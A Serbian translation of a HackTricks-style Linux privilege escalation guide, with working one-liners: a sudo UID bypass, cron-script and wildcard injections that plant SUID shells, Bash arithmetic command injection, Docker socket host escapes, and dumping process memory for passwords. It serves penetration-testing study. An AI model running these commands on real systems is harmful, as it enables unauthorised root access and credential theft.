# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo da prikupljamo informacije o pokrenom OS-u.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Ako **imate dozvole za pisanje na bilo koji direktorijum unutar `PATH`** promenljive, možda ćete moći da hijack-ujete neke libraries ili binaries:
```bash
echo $PATH
```
### Env info

Ima li interesantnih informacija, lozinki ili API ključeva u environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za privilege escalation
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ostali sajtovi na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive verzije kernela sa te stranice, možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenuti NA žrtvi, proverava samo exploits za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel exploitu i tako ćete biti sigurni da je taj exploit validan.

Dodatne kernel exploitation tehnike:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Verzije Sudo pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju neprivilegovanim lokalnim korisnicima da eskaliraju privilegije do root-a putem sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma koji kontroliše korisnik.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` feature.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifikacija potpisa nije uspela

Pogledajte **smasher2 box of HTB** za **primer** kako se ovaj vuln može iskoristiti.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalja sistemska enumeracija
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojati moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container-a, možete pokušati da izađete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je mounted i unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite da li sadrži privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojte korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je instaliran **bilo koji compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga compile-ujete na mašini na kojoj ćete ga koristiti (ili na jednoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagios (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju najsumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuje korišćenje aplikacija kao što su OpenVAS ili slične koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Processes

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se pokreće kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li rade [**electron/cef/chromium debuggers**, možete to zloupotrebiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih otkriva proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarima procesa**, možda možete nekog prepisati.

### Praćenje procesa

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su zadovoljeni određeni uslovi.

### Memorija procesa

Neki servisi na serveru čuvaju **credentials in clear text inside the memory**.\
Obično će vam trebati **root privileges** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada ste već root i želite otkriti još credentials.\
Ipak, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Obratite pažnju da u današnje vreme većina mašina **po defaultu ne dozvoljava ptrace**, što znači da ne možete dump-ovati druge procese koji pripadaju vašem nepriviligovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše pristupačnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi se mogu debug-ovati, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing radio.
> - **kernel.yama.ptrace_scope = 1**: može se debug-ovati samo parent process.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne sme biti praćen ptrace-om. Kada je postavljeno, potreban je reboot da bi se ptracing ponovo omogućio.

#### GDB

Ako imate pristup memoriji nekog FTP servisa (na primer) mogli biste dobiti Heap i pretražiti u njemu njegove credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps pokazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane regije**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske regije čitljive** i njihove offset vrednosti. Te informacije koristimo da **seek u mem fajl i dump-ujemo sve čitljive regije** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` obezbeđuje pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti koristeći /dev/kmem.\  
Obično je `/dev/mem` čitljiv samo od strane **root** i grupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je za Linux ponovno osmišljena verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Nabavite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i dump-ovati proces koji pripada vašem nalogu
- Skript A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije kako biste pronašli različite načine za dump the memory of a process) i pretražiti credentials unutar memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Za ispravan rad zahteva root privilegije.

| Funkcija                                           | Naziv procesa         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Pretraga Regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti preko SSH local port-forwarding i napraviti privileged job za privesc.

Typical chain
- Otkrivanje porta dostupnog samo na loopback-u (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađi kredencijale u operativnim artefaktima:
  - Backups/scripts sa `zip -P <password>`
  - systemd unit koji otkriva `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunelovanje i login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj high-priv job i pokreni odmah (ostavi SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje
- Ne pokrećite Crontab UI kao root; ograničite ga pomoću posvećenog korisnika i minimalnih privilegija
- Vežite na localhost i dodatno ograničite pristup putem firewall/VPN; ne koristite iste lozinke više puta
- Izbegavajte ugrađivanje secrets u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za on-demand job executions

Proverite da li je neki zakazani zadatak ranjiv. Možda možete iskoristiti skriptu koju izvršava root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, u _/etc/crontab_ možete наћи PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju kako korisnik "user" ima права za pisanje над /home/user_)

Ako у ovom crontabu root pokuša да izvrši neku komandu ili skript bez podešene putanje. На пример: _\* \* \* \* root overwrite.sh_\
Onda можете dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skript sa wildcard-om (Wildcard Injection)

Ako se skript izvršava kao root i sadrži “**\***” u komandi, možete to iskoristiti da postignete neočekivane stvari (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako se wildcard nalazi unutar putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation trikova:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parameter expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja iz loga i prosleđuje ih u arithmetic context, napadač može ubaciti command substitution $(...) koji se izvršava kao root kada cron pokrene.

- Zašto to radi: U Bash-u se expansions dešavaju u ovom redosledu: parameter/variable expansion, command substitution, arithmetic expansion, potom word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zamenjuje (izvršavajući komandu), a zatim preostali numerički `0` se koristi za arithmetic tako da skripta nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da napadačem kontrolisan tekst bude upisan u parsirani log tako da polje koje izgleda numerički sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne piše na stdout (ili je preusmerite) tako da arithmetic ostane validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron script** koji se izvršava kao root, možete veoma lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju root izvršava koristi **direktorijum na kojem imate potpuni pristup**, možda bi bilo korisno obrisati taj direktorijum i **napraviti symlink folder ka drugom** koji sadrži skriptu pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Prilagođeno potpisani cron binaries sa writable payloads
Blue teams ponekad "sign" cron-driven binaries tako što dump-uju custom ELF section i grepuju za vendor string pre nego što ih izvrše kao root. Ako je taj binary group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete leak the signing material, možete falsifikovati sekciju i hijack-ovati cron task:

1. Koristite `pspy` da zabeležite tok verifikacije. U Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
2. Ponovo kreirajte očekivani sertifikat koristeći the leaked key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite zlonamernu zamenu (npr. napravite SUID bash, dodajte svoj SSH ključ) i embed-ujte sertifikat u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite zakazani binary pritom čuvajući execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće pokretanje cron-a; kada naivna provera potpisa uspe, vaš payload će se pokrenuti kao root.

### Česti cron poslovi

Možete nadgledati procese da biste pronašli one koji se izvršavaju na svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i eskalirati privilegije.

Na primer, da **nadgledate svake 0.1s tokom 1 minuta**, **sortirate po najmanje izvršenim komandama** i obrišete komande koje su se izvršavale najviše, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i prikazati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob stavljanjem carriage return-a nakon komentara (bez karaktera nove linije), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete da pišete bilo koji `.service` fajl, ako možete, **možete ga izmeniti** tako da **izvršava** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer kreirajte svoj backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Binarni fajlovi servisa sa permisijama za upis

Imajte na umu da ako imate **permisije za upis nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti u backdoors tako da kada se servisi ponovo pokrenu backdoors budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **upisivati** u bilo koji od foldera na putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni fajl** sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se servisu zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da startuju/stopuju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čije se ime završava sa `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cron-u pošto imaju ugrađenu podršku za kalendarske događaje i monotoničke vremenske događaje i mogu da se pokreću asinhrono.

Možete izlistati sve tajmere sa:
```bash
systemctl list-timers --all
```
### Writable timers

Ako možete izmeniti timer, možete ga naterati da izvrši neke postojeće jedinice systemd.unit (kao što su `.service` ili `.target`).
```bash
Unit=backdoor.service
```
> Jedinica koja se aktivira kada ovaj timer istekne. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano upućuje na service koji ima isto ime kao timer jedinica, osim sufiksa. (Pogledajte gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identični, osim sufiksa.

Dakle, da biste zloupotrebili ovo ovlašćenje potrebno je da:

- Pronađete neku systemd jedinicu (poput `.service`) koja je **izvršava zapisljiv binarni fajl**
- Pronađete neku systemd jedinicu koja **izvodi relativnu putanju** i imate **zapisiva prava** nad **systemd PATH** (da imitirate taj izvršni fajl)

**Learn more about timers with `man systemd.timer`.**

### **Omogućavanje timera**

Da biste omogućili timer, potrebne su root privilegije i potrebno je izvršiti:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istim ili različitim mašinama unutar client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i podešavaju se preko `.socket` fajlova.

Sockets can be configured using `.socket` files.

**Saznajte više o soketima sa `man systemd.socket`.** U ovom fajlu može se konfigurisati nekoliko zanimljivih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Upisivi .socket fajlovi

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Upisivi soketi

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumeracija Unix soketa
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** requests (_Ne mislim na .socket files već na fajlove koji funkcionišu kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP** zahtev, onda možete sa njim **komunicirati** i možda **exploit some vulnerability**.

### Writable Docker Socket

The Docker socket, koji se često nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba zaštititi. Podrazumevano, ima pravo pisanja za korisnika `root` i članove grupe `docker`. Imati write access na ovom socketu može dovesti do privilege escalation. Evo pregleda kako se ovo može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate write access na Docker socket, možete izvršiti privilege escalation koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande omogućavaju da pokrenete container sa root pristupom fajl sistemu hosta.

#### **Korišćenje Docker API-a direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Dohvatite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Kreiranje containera:** Pošaljite zahtev za kreiranje containera koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Priključivanje na container:** Koristite `socat` da uspostavite konekciju ka containeru, što omogućava izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u containeru sa root pristupom fajl sistemu hosta.

### Ostalo

Obratite pažnju da ako imate dozvole za pisanje na Docker socket zato što ste **u grupi `docker`** imate [**više načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**Docker API osluškuje na portu** možete ga takođe kompromitovati](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **još načina da izađete iz docker-a ili da ga zloupotrebite za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako ustanovite da možete koristiti komandu **`ctr`**, pročitajte sledeću stranicu jer **možda možete zloupotrebiti tu komandu za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako ustanovite da možete koristiti komandu **`runc`**, pročitajte sledeću stranicu jer **možda možete zloupotrebiti tu komandu za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem za međuprocesnu komunikaciju (**Inter-Process Communication (IPC)**) koji omogućava aplikacijama efikasnu interakciju i razmenu podataka. Dizajniran za moderni Linux sistem, pruža robustan okvir za različite oblike komunikacije između aplikacija.

